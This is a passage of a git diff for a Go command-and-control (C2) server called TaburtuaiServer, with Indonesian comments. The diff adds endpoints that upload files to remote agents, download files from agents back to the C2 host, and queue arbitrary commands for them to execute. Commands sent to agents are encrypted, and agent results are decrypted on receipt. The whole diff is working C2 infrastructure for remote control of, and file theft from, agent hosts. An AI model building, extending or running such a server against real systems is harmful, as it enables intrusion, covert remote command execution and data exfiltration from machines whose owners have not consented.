@@ -3,6 +3,11 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"io/ioutil" // Diperlukan untuk membaca file
+	"net/http"  // Diperlukan untuk http.StatusOK dll.
+	"strings"
+
+	// Diperlukan untuk operasi file sistem
 	"sort"
 	"strconv"
 	"sync"
@@ -16,7 +21,7 @@ import (
 type Command struct {
 	ID          string            `json:"id"`
 	AgentID     string            `json:"agent_id"`
-	Command     string            `json:"command"`
+	Command     string            `json:"command"` // Bisa "upload", "download", "execute", atau nama perintah spesifik
 	Args        []string          `json:"args,omitempty"`
 	WorkingDir  string            `json:"working_dir,omitempty"`
 	Timeout     int               `json:"timeout,omitempty"` // seconds
@@ -28,6 +33,12 @@ type Command struct {
 	Output      string            `json:"output,omitempty"`
 	Error       string            `json:"error,omitempty"`
 	Metadata    map[string]string `json:"metadata,omitempty"`
+
+	OperationType   string `json:"operation_type,omitempty"`   // "upload", "download"
+	SourcePath      string `json:"source_path,omitempty"`      // Path file di agent (untuk download) atau di C2 (untuk upload ke agent)
+	DestinationPath string `json:"destination_path,omitempty"` // Path tujuan di agent (untuk upload) atau di C2 (untuk download dari agent)
+	FileContent     []byte `json:"file_content,omitempty"`     // Untuk mengirim konten file (upload ke agent) - ini akan dienkripsi oleh server
+	IsEncrypted     bool   `json:"is_encrypted,omitempty"`     // Menandakan apakah FileContent sudah dienkripsi (oleh server sebelum dikirim ke agent)
 }
 
 // CommandQueue manages commands for agents
@@ -45,7 +56,152 @@ var commandQueue = &CommandQueue{
 	results: make(map[string]*Command),
 }
 
-// Enhanced API handlers for Phase 2
+// --- BARU: Handler untuk upload file ke agent ---
+func (s *TaburtuaiServer) uploadToAgent(c *gin.Context) {
+	agentID := c.Param("id")
+
+	// Pastikan agent ada dan online
+	agent, exists := s.monitor.GetAgent(agentID)
+	if !exists {
+		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
+		return
+	}
+	if agent.Status != StatusOnline { //
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s", agent.Status)})
+		return
+	}
+
+	// Ambil file dari form-data
+	file, err := c.FormFile("file")
+	if err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "File not provided in request: " + err.Error()})
+		return
+	}
+
+	destinationPath := c.PostForm("destination_path")
+	if destinationPath == "" {
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Destination path not provided"})
+		return
+	}
+
+	// Baca konten file
+	srcFile, err := file.Open()
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Failed to open uploaded file: " + err.Error()})
+		return
+	}
+	defer srcFile.Close()
+
+	fileContent, err := ioutil.ReadAll(srcFile)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Failed to read uploaded file content: " + err.Error()})
+		return
+	}
+
+	// Enkripsi konten file jika crypto manager ada
+	var encryptedFileContent []byte
+	isContentEncrypted := false
+	if s.crypto != nil {
+		encryptedString, err := s.crypto.EncryptData(fileContent) //
+		if err != nil {
+			LogError(SYSTEM, fmt.Sprintf("Failed to encrypt file content for agent %s: %v", agentID, err), agentID) //
+			// Pertimbangkan apakah akan mengirim file tidak terenkripsi atau gagal sama sekali
+			// Untuk keamanan, lebih baik gagal jika enkripsi gagal
+			c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Failed to encrypt file content"})
+			return
+		}
+		encryptedFileContent = []byte(encryptedString) // CryptoManager.EncryptData mengembalikan string
+		isContentEncrypted = true
+		LogInfo(SYSTEM, fmt.Sprintf("File content encrypted for upload to agent %s, original size: %d, encrypted size: %d", agentID, len(fileContent), len(encryptedFileContent)), agentID) //
+	} else {
+		LogWarn(SYSTEM, fmt.Sprintf("Crypto manager not available. Sending file content unencrypted to agent %s.", agentID), agentID) //
+		encryptedFileContent = fileContent                                                                                            // Kirim apa adanya jika tidak ada enkripsi
+	}
+
+	cmd := &Command{
+		ID:              uuid.New().String(),
+		AgentID:         agentID,
+		Command:         "internal_upload", // Nama perintah internal untuk agent
+		OperationType:   "upload",
+		DestinationPath: destinationPath,
+		FileContent:     encryptedFileContent,
+		IsEncrypted:     isContentEncrypted,
+		CreatedAt:       time.Now(),
+		Status:          "pending",
+		Timeout:         300, // Timeout 5 menit untuk operasi file
+	}
+
+	commandQueue.mutex.Lock()
+	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
+	commandQueue.mutex.Unlock()
+
+	LogCommand(agentID, fmt.Sprintf("UPLOAD %s to %s", file.Filename, destinationPath), "Queued for upload", true) //
+
+	c.JSON(http.StatusOK, APIResponse{
+		Success: true,
+		Message: "File upload command queued successfully",
+		Data:    map[string]interface{}{"command_id": cmd.ID, "status": cmd.Status},
+	})
+}
+
+// --- BARU: Handler untuk download file dari agent ---
+func (s *TaburtuaiServer) downloadFromAgent(c *gin.Context) {
+	agentID := c.Param("id")
+
+	agent, exists := s.monitor.GetAgent(agentID) //
+	if !exists {
+		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
+		return
+	}
+	if agent.Status != StatusOnline { //
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s", agent.Status)})
+		return
+	}
+
+	var req struct {
+		SourcePath      string `json:"source_path" binding:"required"`
+		DestinationPath string `json:"destination_path"` // Path di server C2 untuk menyimpan file, bisa opsional
+	}
+
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Invalid request: " + err.Error()})
+		return
+	}
+
+	// Jika DestinationPath tidak disediakan, kita bisa membuat nama file default atau menyimpannya dengan ID perintah
+	// Untuk sekarang, kita akan meneruskannya ke metadata perintah, dan submitResult akan menanganinya.
+	cmdDestinationPath := req.DestinationPath
+	if cmdDestinationPath == "" {
+		// Buat path default jika tidak ada, misalnya di ./downloads/<agent_id>/<filename_dari_sourcepath>
+		// Ini memerlukan parsing nama file dari SourcePath
+	}
+
+	cmd := &Command{
+		ID:              uuid.New().String(),
+		AgentID:         agentID,
+		Command:         "internal_download", // Nama perintah internal untuk agent
+		OperationType:   "download",
+		SourcePath:      req.SourcePath,
+		DestinationPath: cmdDestinationPath, // Ini adalah path di server C2 tempat file akan disimpan
+		CreatedAt:       time.Now(),
+		Status:          "pending",
+		Timeout:         300, // Timeout 5 menit
+	}
+
+	commandQueue.mutex.Lock()
+	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
+	commandQueue.mutex.Unlock()
+
+	LogCommand(agentID, fmt.Sprintf("DOWNLOAD %s", req.SourcePath), "Queued for download", true) //
+
+	c.JSON(http.StatusOK, APIResponse{
+		Success: true,
+		Message: "File download command queued successfully",
+		Data:    map[string]interface{}{"command_id": cmd.ID, "status": cmd.Status},
+	})
+}
+
+// --- AKHIR BARU ---
 
 // executeCommand - POST /api/v1/command
 func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
@@ -59,7 +215,7 @@ func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(400, APIResponse{
+		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
 			Success: false,
 			Error:   "Invalid request: " + err.Error(),
 		})
@@ -67,17 +223,17 @@ func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
 	}
 
 	// Check if agent exists and is online
-	agent, exists := s.monitor.GetAgent(req.AgentID)
+	agent, exists := s.monitor.GetAgent(req.AgentID) //
 	if !exists {
-		c.JSON(404, APIResponse{
+		c.JSON(http.StatusNotFound, APIResponse{ // Menggunakan http.StatusNotFound
 			Success: false,
 			Error:   "Agent not found",
 		})
 		return
 	}
 
-	if agent.Status != StatusOnline {
-		c.JSON(400, APIResponse{
+	if agent.Status != StatusOnline { //
+		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
 			Success: false,
 			Error:   fmt.Sprintf("Agent is %s", agent.Status),
 		})
@@ -86,15 +242,16 @@ func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
 
 	// Create command
 	cmd := &Command{
-		ID:         uuid.New().String(),
-		AgentID:    req.AgentID,
-		Command:    req.Command,
-		Args:       req.Args,
-		WorkingDir: req.WorkingDir,
-		Timeout:    req.Timeout,
-		CreatedAt:  time.Now(),
-		Status:     "pending",
-		Metadata:   req.Metadata,
+		ID:            uuid.New().String(),
+		AgentID:       req.AgentID,
+		Command:       req.Command,
+		OperationType: "execute", // --- BARU: Tandai sebagai perintah eksekusi ---
+		Args:          req.Args,
+		WorkingDir:    req.WorkingDir,
+		Timeout:       req.Timeout,
+		CreatedAt:     time.Now(),
+		Status:        "pending",
+		Metadata:      req.Metadata,
 	}
 
 	if cmd.Timeout == 0 {
@@ -107,9 +264,9 @@ func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
 	commandQueue.mutex.Unlock()
 
 	// Log command
-	LogCommand(req.AgentID, req.Command, "Queued", true)
+	LogCommand(req.AgentID, req.Command, "Queued", true) //
 
-	c.JSON(200, APIResponse{
+	c.JSON(http.StatusOK, APIResponse{ // Menggunakan http.StatusOK
 		Success: true,
 		Message: "Command queued successfully",
 		Data: map[string]interface{}{
@@ -120,15 +277,13 @@ func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
 	})
 }
 
+// getNextCommand - GET /api/v1/command/:id/next
 func (s *TaburtuaiServer) getNextCommand(c *gin.Context) {
 	agentID := c.Param("id")
 
 	// Verify agent
-	if _, exists := s.monitor.GetAgent(agentID); !exists {
-		c.JSON(404, APIResponse{
-			Success: false,
-			Error:   "Agent not found",
-		})
+	if _, exists := s.monitor.GetAgent(agentID); !exists { //
+		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
 		return
 	}
 
@@ -145,19 +300,32 @@ func (s *TaburtuaiServer) getNextCommand(c *gin.Context) {
 			commandQueue.results[active.ID] = active
 			delete(commandQueue.active, agentID)
 
-			LogCommand(agentID, active.Command, "Timeout", false)
+			LogCommand(agentID, active.Command, "Timeout", false) //
 		} else {
-			// TEMPORARY: Send unencrypted
-			LogInfo(SYSTEM, fmt.Sprintf("Sending unencrypted active command to agent %s", agentID), "")
-			c.JSON(200, APIResponse{
-				Success: true,
-				Data:    active, // Send unencrypted
-			})
+			// --- MODIFIKASI: Kirim data terenkripsi jika crypto ada ---
+			var responseData interface{} = active // Default unencrypted
+			if s.crypto != nil {
+				cmdJSON, err := json.Marshal(active)
+				if err != nil {
+					LogError(SYSTEM, fmt.Sprintf("Failed to marshal active command for agent %s: %v", agentID, err), agentID) //
+				} else {
+					encrypted, err := s.crypto.EncryptData(cmdJSON) //
+					if err != nil {
+						LogError(SYSTEM, fmt.Sprintf("Failed to encrypt active command for agent %s: %v", agentID, err), agentID) //
+					} else {
+						responseData = map[string]string{"encrypted": encrypted}
+						LogInfo(SYSTEM, fmt.Sprintf("Sending encrypted ACTIVE command to agent %s", agentID), agentID) //
+					}
+				}
+			} else {
+				LogInfo(SYSTEM, fmt.Sprintf("Sending unencrypted active command to agent %s", agentID), agentID) //
+			}
+			c.JSON(http.StatusOK, APIResponse{Success: true, Data: responseData})
+			// --- AKHIR MODIFIKASI ---
 			return
 		}
 	}
 
-	// Get next command from queue
 	// Get next command from queue
 	if queue, exists := commandQueue.queues[agentID]; exists && len(queue) > 0 {
 		cmd := queue[0]
@@ -168,140 +336,231 @@ func (s *TaburtuaiServer) getNextCommand(c *gin.Context) {
 		cmd.ExecutedAt = time.Now()
 		commandQueue.active[agentID] = cmd
 
-		// Try encryption with debug
-		var responseData interface{}
+		// --- MODIFIKASI: Enkripsi perintah sebelum mengirim ---
+		var responseData interface{} = cmd // Default unencrypted
+
+		// Khusus untuk upload, FileContent sudah dienkripsi oleh handler uploadToAgent
+		// jadi kita tidak mengenkripsi ulang seluruh objek cmd jika itu adalah upload.
+		// Agent akan mendekripsi FileContent secara spesifik.
+		// Namun, untuk konsistensi, kita bisa mengenkripsi seluruh payload JSON.
+		// Jika cmd.OperationType adalah "upload", cmd.FileContent sudah berisi data terenkripsi (sebagai []byte string base64).
+		// Agent harus tahu cara menanganinya.
+		// Untuk sekarang, kita akan mengenkripsi seluruh objek Command.
 
 		if s.crypto != nil {
 			cmdJSON, err := json.Marshal(cmd)
 			if err != nil {
-				LogError(SYSTEM, fmt.Sprintf("Failed to marshal command: %v", err), "")
-				responseData = cmd
+				LogError(SYSTEM, fmt.Sprintf("Failed to marshal command for agent %s: %v", agentID, err), agentID) //
 			} else {
-				LogInfo(SYSTEM, fmt.Sprintf("Encrypting command for agent %s", agentID), "")
-
-				encrypted, err := s.crypto.EncryptData(cmdJSON)
+				encrypted, err := s.crypto.EncryptData(cmdJSON) //
 				if err != nil {
-					LogError(SYSTEM, fmt.Sprintf("Failed to encrypt command: %v", err), "")
-					responseData = cmd
+					LogError(SYSTEM, fmt.Sprintf("Failed to encrypt command for agent %s: %v", agentID, err), agentID) //
 				} else {
-					LogInfo(SYSTEM, fmt.Sprintf("Encryption successful"), "")
-
-					responseData = map[string]string{
-						"encrypted": encrypted,
-					}
+					responseData = map[string]string{"encrypted": encrypted}
+					LogInfo(SYSTEM, fmt.Sprintf("Encrypting and sending command (ID: %s, Type: %s) to agent %s", cmd.ID, cmd.OperationType, agentID), agentID) //
 				}
 			}
 		} else {
-			LogInfo(SYSTEM, "No crypto manager available", "")
-			responseData = cmd
+			LogInfo(SYSTEM, fmt.Sprintf("Sending unencrypted command (ID: %s, Type: %s) to agent %s", cmd.ID, cmd.OperationType, agentID), agentID) //
 		}
-
-		c.JSON(200, APIResponse{
-			Success: true,
-			Data:    responseData,
-		})
+		c.JSON(http.StatusOK, APIResponse{Success: true, Data: responseData})
+		// --- AKHIR MODIFIKASI ---
 		return
 	}
+
+	// No command found
+	c.JSON(http.StatusNoContent, nil) // Sesuai dengan implementasi agent yang mengharapkan 204 jika tidak ada perintah
 }
 
 // submitCommandResult - POST /api/v1/command/result
 func (s *TaburtuaiServer) submitCommandResult(c *gin.Context) {
+	var reqData []byte
+	var err error
+
+	if c.Request.Body != nil {
+		reqData, err = ioutil.ReadAll(c.Request.Body)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Failed to read request body: " + err.Error()})
+			return
+		}
+	}
+
+	var encryptedPayloadCheck struct {
+		EncryptedPayload string `json:"encrypted_payload"`
+	}
+	// isFullPayloadEncrypted tidak lagi secara langsung mengontrol dekripsi field,
+	// tapi tetap berguna untuk mengetahui apakah payload awal perlu didekripsi.
+	if err := json.Unmarshal(reqData, &encryptedPayloadCheck); err == nil && encryptedPayloadCheck.EncryptedPayload != "" {
+		if s.crypto != nil {
+			LogInfo(SYSTEM, "Received fully encrypted command result payload, decrypting...", "")
+			decryptedData, derr := s.crypto.DecryptData(encryptedPayloadCheck.EncryptedPayload) //
+			if derr != nil {
+				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt command result payload: %v", derr), "")
+				c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Failed to decrypt result payload: " + derr.Error()})
+				return
+			}
+			reqData = decryptedData
+			LogInfo(SYSTEM, "Command result payload decrypted successfully", "")
+		} else {
+			LogError(SYSTEM, "Received encrypted_payload but no crypto manager configured on server.", "")
+			c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Server cannot process encrypted payload."})
+			return
+		}
+	}
+
 	var req struct {
 		CommandID string `json:"command_id" binding:"required"`
 		ExitCode  int    `json:"exit_code"`
-		Output    string `json:"output"`
-		Error     string `json:"error"`
-		Encrypted bool   `json:"encrypted"`
+		Output    string `json:"output"`    // Ini adalah output yang mungkin dienkripsi oleh agent
+		Error     string `json:"error"`     // Ini juga mungkin dienkripsi oleh agent
+		Encrypted bool   `json:"encrypted"` // Flag dari agent menandakan Output/Error dienkripsi
 	}
 
-	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(400, APIResponse{
+	if err := json.Unmarshal(reqData, &req); err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{
 			Success: false,
-			Error:   "Invalid request: " + err.Error(),
+			Error:   "Invalid request format after potential payload decryption: " + err.Error(),
 		})
 		return
 	}
 
-	// Decrypt if needed
+	// --- PERBAIKAN UTAMA DI SINI ---
+	// Selalu periksa req.Encrypted (dari agent) untuk mendekripsi field Output dan Error,
+	// terlepas dari apakah seluruh payload CommandResult dienkripsi untuk transport.
 	if req.Encrypted && s.crypto != nil {
-		LogInfo(SYSTEM, "Decrypting command result", "")
-
 		if req.Output != "" {
-			if decrypted, err := s.crypto.DecryptData(req.Output); err == nil {
-				req.Output = string(decrypted)
-				LogInfo(SYSTEM, fmt.Sprintf("Output decrypted: %d bytes", len(decrypted)), "")
+			LogInfo(SYSTEM, fmt.Sprintf("Decrypting agent-encrypted 'Output' field for command %s", req.CommandID), "") //
+			decryptedOutput, errDecOutput := s.crypto.DecryptData(req.Output)                                           //
+			if errDecOutput == nil {
+				req.Output = string(decryptedOutput)
+				LogInfo(SYSTEM, fmt.Sprintf("'Output' field decrypted successfully for command %s, size: %d", req.CommandID, len(decryptedOutput)), "") //
 			} else {
-				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt output: %v", err), "")
+				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt agent-encrypted 'Output' field for command %s: %v", req.CommandID, errDecOutput), "") //
+				// Tambahkan ke error atau biarkan output terenkripsi, tergantung preferensi.
+				// Di sini kita tambahkan ke error agar terlihat.
+				if req.Error != "" {
+					req.Error += " | "
+				}
+				req.Error += fmt.Sprintf("(server failed to decrypt agent's output: %v)", errDecOutput)
 			}
 		}
-
-		if req.Error != "" {
-			if decrypted, err := s.crypto.DecryptData(req.Error); err == nil {
-				req.Error = string(decrypted)
+		// Asumsikan jika req.Encrypted true, field Error juga mungkin dienkripsi oleh agent
+		if req.Error != "" && !(strings.Contains(req.Error, "server failed to decrypt agent's output")) { // Jangan dekripsi ulang error yang sudah kita tambahkan
+			LogInfo(SYSTEM, fmt.Sprintf("Decrypting agent-encrypted 'Error' field for command %s", req.CommandID), "") //
+			decryptedError, errDecError := s.crypto.DecryptData(req.Error)                                             //
+			if errDecError == nil {
+				req.Error = string(decryptedError)
+				LogInfo(SYSTEM, fmt.Sprintf("'Error' field decrypted successfully for command %s", req.CommandID), "") //
+			} else {
+				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt agent-encrypted 'Error' field for command %s: %v", req.CommandID, errDecError), "") //
+				// Biarkan error terenkripsi jika dekripsi gagal, atau tambahkan pesan
 			}
 		}
 	}
+	// --- AKHIR PERBAIKAN UTAMA ---
 
 	commandQueue.mutex.Lock()
 	defer commandQueue.mutex.Unlock()
 
-	// Find active command
 	var cmd *Command
-	for agentID, active := range commandQueue.active {
+	var agentIDForCmd string
+	for agentIDLoop, active := range commandQueue.active {
 		if active.ID == req.CommandID {
 			cmd = active
-			delete(commandQueue.active, agentID)
+			agentIDForCmd = agentIDLoop
+			delete(commandQueue.active, agentIDForCmd)
 			break
 		}
 	}
 
 	if cmd == nil {
-		c.JSON(404, APIResponse{
-			Success: false,
-			Error:   "Command not found or already completed",
-		})
-		return
+		// Periksa apakah sudah ada di results (mungkin karena race condition atau pengiriman ulang)
+		if existingResult, exists := commandQueue.results[req.CommandID]; exists {
+			LogWarn(SYSTEM, fmt.Sprintf("Received result for already completed command %s. Updating.", req.CommandID), existingResult.AgentID) //
+			cmd = existingResult                                                                                                               // Gunakan hasil yang ada untuk diupdate
+		} else {
+			c.JSON(http.StatusNotFound, APIResponse{
+				Success: false,
+				Error:   "Command not found in active queue or results.",
+			})
+			return
+		}
 	}
 
-	// Update command with results
 	cmd.CompletedAt = time.Now()
 	cmd.ExitCode = req.ExitCode
-	cmd.Output = req.Output
-	cmd.Error = req.Error
+	cmd.Output = req.Output // Sekarang ini seharusnya sudah plaintext jika enkripsi berhasil
+	cmd.Error = req.Error   // Ini juga
 
-	if req.ExitCode == 0 {
+	if req.ExitCode == 0 && !strings.Contains(cmd.Error, "server failed to decrypt") { // Jangan set completed jika server gagal dekripsi
 		cmd.Status = "completed"
 	} else {
 		cmd.Status = "failed"
 	}
 
-	// Store result
+	// ... (sisa fungsi, termasuk penanganan hasil download dan logging, tetap sama seperti sebelumnya) ...
+	// Penanganan khusus untuk hasil download
+	if cmd.OperationType == "download" && cmd.Status == "completed" {
+		if cmd.DestinationPath == "" {
+			LogWarn(SYSTEM, fmt.Sprintf("Download completed for command %s by agent %s, but no server destination path was set. Output might be in cmd.Output if small.", cmd.ID, cmd.AgentID), cmd.AgentID)
+		} else {
+			// Pastikan direktori ada
+			// err := os.MkdirAll(filepath.Dir(cmd.DestinationPath), 0755)
+			// if err != nil { ... }
+			err := ioutil.WriteFile(cmd.DestinationPath, []byte(cmd.Output), 0644)
+			if err != nil {
+				cmd.Error += fmt.Sprintf(" | Server failed to save downloaded file to %s: %v", cmd.DestinationPath, err)
+				cmd.Status = "failed" // Set status gagal jika penyimpanan file gagal
+				LogError(SYSTEM, fmt.Sprintf("Failed to save downloaded file for command %s to %s: %v", cmd.ID, cmd.DestinationPath, err), cmd.AgentID)
+			} else {
+				// Update cmd.Output dengan pesan sukses yang lebih informatif, bukan konten file
+				savedOutputLen := len(cmd.Output) // Simpan panjang output asli sebelum ditimpa
+				cmd.Output = fmt.Sprintf("File successfully downloaded from agent and saved to server at %s (Size: %d bytes)", cmd.DestinationPath, savedOutputLen)
+				LogInfo(SYSTEM, fmt.Sprintf("File for command %s downloaded by agent %s and saved to %s", cmd.ID, cmd.AgentID, cmd.DestinationPath), cmd.AgentID)
+			}
+		}
+	} else if cmd.OperationType == "upload" && cmd.Status == "completed" {
+		LogInfo(SYSTEM, fmt.Sprintf("Upload command %s to agent %s completed. Agent output: %s", cmd.ID, cmd.AgentID, cmd.Output), cmd.AgentID)
+	}
+
 	commandQueue.results[cmd.ID] = cmd
 
-	// Log execution
-	success := cmd.ExitCode == 0
-	result := cmd.Output
-	if len(result) > 100 {
-		result = result[:100] + "..."
+	success := cmd.Status == "completed" // Status "completed" sekarang lebih akurat
+	resultLog := cmd.Output
+	if len(resultLog) > 256 {
+		resultLog = resultLog[:253] + "..."
 	}
 	if cmd.Error != "" {
-		result = "Error: " + cmd.Error
+		if resultLog != "" && !strings.HasPrefix(resultLog, "File successfully downloaded") { // Jangan gabung jika sudah ada pesan sukses download
+			resultLog += " | Error: " + cmd.Error
+		} else {
+			resultLog = "Error: " + cmd.Error
+		}
 	}
+	LogCommand(cmd.AgentID, fmt.Sprintf("%s (Type: %s)", cmd.Command, cmd.OperationType), resultLog, success)
 
-	LogCommand(cmd.AgentID, cmd.Command, result, success)
-
-	// Update agent metrics
 	duration := cmd.CompletedAt.Sub(cmd.ExecutedAt)
+	if cmd.ExecutedAt.IsZero() { // Jika ExecutedAt tidak pernah diset (misalnya perintah gagal sebelum eksekusi)
+		duration = cmd.CompletedAt.Sub(cmd.CreatedAt)
+	}
 	s.monitor.RecordCommand(cmd.AgentID, cmd.Command, success, duration)
 
-	c.JSON(200, APIResponse{
-		Success: true,
-		Message: "Command result submitted",
-		Data: map[string]interface{}{
-			"command_id": cmd.ID,
-			"status":     cmd.Status,
-			"duration":   duration.String(),
-		},
+	responseMessage := "Command result processed"
+	responseData := map[string]interface{}{
+		"command_id": cmd.ID,
+		"status":     cmd.Status,
+		"duration":   duration.String(),
+	}
+	if cmd.OperationType == "download" && cmd.Status == "completed" {
+		responseMessage = cmd.Output // Kirim pesan sukses dari server (bukan konten file)
+	} else if cmd.Status == "failed" && cmd.Error != "" {
+		responseMessage = fmt.Sprintf("Command failed: %s", cmd.Error)
+	}
+
+	c.JSON(http.StatusOK, APIResponse{
+		Success: true, // Server berhasil memproses hasilnya, meskipun perintahnya mungkin gagal di agent
+		Message: responseMessage,
+		Data:    responseData,
 	})
 }
 
@@ -314,20 +573,30 @@ func (s *TaburtuaiServer) getCommandStatus(c *gin.Context) {
 
 	// Check results first
 	if cmd, exists := commandQueue.results[commandID]; exists {
-		c.JSON(200, APIResponse{
-			Success: true,
-			Data:    cmd,
-		})
+		// --- BARU: Jangan kirim FileContent yang besar dalam status ---
+		cmdCopy := *cmd
+		if cmdCopy.OperationType == "upload" || (cmdCopy.OperationType == "download" && len(cmdCopy.Output) > 1024) { // Jika output adalah file besar
+			cmdCopy.FileContent = nil // Kosongkan konten file mentah dari respons status
+			if len(cmdCopy.Output) > 1024 && cmdCopy.OperationType == "download" {
+				// Beri indikasi bahwa output file ada tapi tidak disertakan di sini
+				cmdCopy.Output = fmt.Sprintf("[File content too large to display in status, size: %d bytes. Downloaded to: %s]", len(cmd.Output), cmd.DestinationPath)
+			}
+		}
+		// --- AKHIR BARU ---
+		c.JSON(http.StatusOK, APIResponse{Success: true, Data: cmdCopy})
 		return
 	}
 
 	// Check active commands
 	for _, cmd := range commandQueue.active {
 		if cmd.ID == commandID {
-			c.JSON(200, APIResponse{
-				Success: true,
-				Data:    cmd,
-			})
+			// --- BARU: Jangan kirim FileContent yang besar dalam status ---
+			cmdCopy := *cmd
+			if cmdCopy.OperationType == "upload" {
+				cmdCopy.FileContent = nil
+			}
+			// --- AKHIR BARU ---
+			c.JSON(http.StatusOK, APIResponse{Success: true, Data: cmdCopy})
 			return
 		}
 	}
@@ -336,19 +605,19 @@ func (s *TaburtuaiServer) getCommandStatus(c *gin.Context) {
 	for _, queue := range commandQueue.queues {
 		for _, cmd := range queue {
 			if cmd.ID == commandID {
-				c.JSON(200, APIResponse{
-					Success: true,
-					Data:    cmd,
-				})
+				// --- BARU: Jangan kirim FileContent yang besar dalam status ---
+				cmdCopy := *cmd
+				if cmdCopy.OperationType == "upload" {
+					cmdCopy.FileContent = nil
+				}
+				// --- AKHIR BARU ---
+				c.JSON(http.StatusOK, APIResponse{Success: true, Data: cmdCopy})
 				return
 			}
 		}
 	}
 
-	c.JSON(404, APIResponse{
-		Success: false,
-		Error:   "Command not found",
-	})
+	c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Command not found"})
 }
 
 // getAgentCommands - GET /api/v1/agent/:id/commands
@@ -366,48 +635,59 @@ func (s *TaburtuaiServer) getAgentCommands(c *gin.Context) {
 	commandQueue.mutex.RLock()
 	defer commandQueue.mutex.RUnlock()
 
-	var commands []*Command
+	var commandsToReturn []*Command // Slice baru untuk menyimpan command yang akan dikembalikan
 
-	// Get all commands for agent
+	// Kumpulkan semua command yang relevan
+	var allAgentCommands []*Command
+
 	for _, cmd := range commandQueue.results {
 		if cmd.AgentID == agentID {
 			if status == "" || cmd.Status == status {
-				commands = append(commands, cmd)
+				allAgentCommands = append(allAgentCommands, cmd)
 			}
 		}
 	}
-
-	// Add active command
 	if active, exists := commandQueue.active[agentID]; exists {
 		if status == "" || active.Status == status {
-			commands = append(commands, active)
+			allAgentCommands = append(allAgentCommands, active)
 		}
 	}
-
-	// Add queued commands
 	if queue, exists := commandQueue.queues[agentID]; exists {
 		for _, cmd := range queue {
 			if status == "" || cmd.Status == status {
-				commands = append(commands, cmd)
+				allAgentCommands = append(allAgentCommands, cmd)
 			}
 		}
 	}
 
 	// Sort by creation time (newest first)
-	sort.Slice(commands, func(i, j int) bool {
-		return commands[i].CreatedAt.After(commands[j].CreatedAt)
+	sort.Slice(allAgentCommands, func(i, j int) bool {
+		return allAgentCommands[i].CreatedAt.After(allAgentCommands[j].CreatedAt)
 	})
 
-	// Limit results
-	if len(commands) > limit {
-		commands = commands[:limit]
+	// Limit results dan bersihkan FileContent
+	for i, cmd := range allAgentCommands {
+		if i >= limit {
+			break
+		}
+		cmdCopy := *cmd // Buat salinan
+		// --- BARU: Jangan kirim FileContent atau Output besar dalam list ---
+		cmdCopy.FileContent = nil
+		if (cmdCopy.OperationType == "download" || cmdCopy.OperationType == "execute") && len(cmdCopy.Output) > 256 {
+			cmdCopy.Output = cmdCopy.Output[:253] + "..."
+		}
+		if len(cmdCopy.Error) > 256 {
+			cmdCopy.Error = cmdCopy.Error[:253] + "..."
+		}
+		// --- AKHIR BARU ---
+		commandsToReturn = append(commandsToReturn, &cmdCopy)
 	}
 
-	c.JSON(200, APIResponse{
+	c.JSON(http.StatusOK, APIResponse{
 		Success: true,
 		Data: map[string]interface{}{
-			"commands": commands,
-			"count":    len(commands),
+			"commands": commandsToReturn, // Kirim slice yang sudah dimodifikasi
+			"count":    len(commandsToReturn),
 		},
 	})
 }
@@ -422,12 +702,13 @@ func (s *TaburtuaiServer) clearAgentQueue(c *gin.Context) {
 	count := 0
 	if queue, exists := commandQueue.queues[agentID]; exists {
 		count = len(queue)
-		delete(commandQueue.queues, agentID)
+		delete(commandQueue.queues, agentID)                                                                         // Hapus seluruh antrian untuk agent tersebut
+		LogInfo(AUDIT, fmt.Sprintf("Cleared %d pending commands for agent %s by operator", count, agentID), agentID) //
 	}
 
-	c.JSON(200, APIResponse{
+	c.JSON(http.StatusOK, APIResponse{
 		Success: true,
-		Message: fmt.Sprintf("Cleared %d pending commands", count),
+		Message: fmt.Sprintf("Cleared %d pending commands for agent %s", count, agentID),
 	})
 }
 
@@ -439,49 +720,42 @@ func (s *TaburtuaiServer) getQueueStats(c *gin.Context) {
 	stats := map[string]interface{}{
 		"total_queued":    0,
 		"total_active":    len(commandQueue.active),
-		"total_completed": len(commandQueue.results),
+		"total_completed": len(commandQueue.results), // Ini adalah total hasil yang masih disimpan
 		"by_agent":        make(map[string]map[string]int),
 	}
 
-	// Count queued commands
+	totalQueuedCount := 0
 	for agentID, queue := range commandQueue.queues {
-		stats["total_queued"] = stats["total_queued"].(int) + len(queue)
+		agentQueueCount := len(queue)
+		totalQueuedCount += agentQueueCount
 
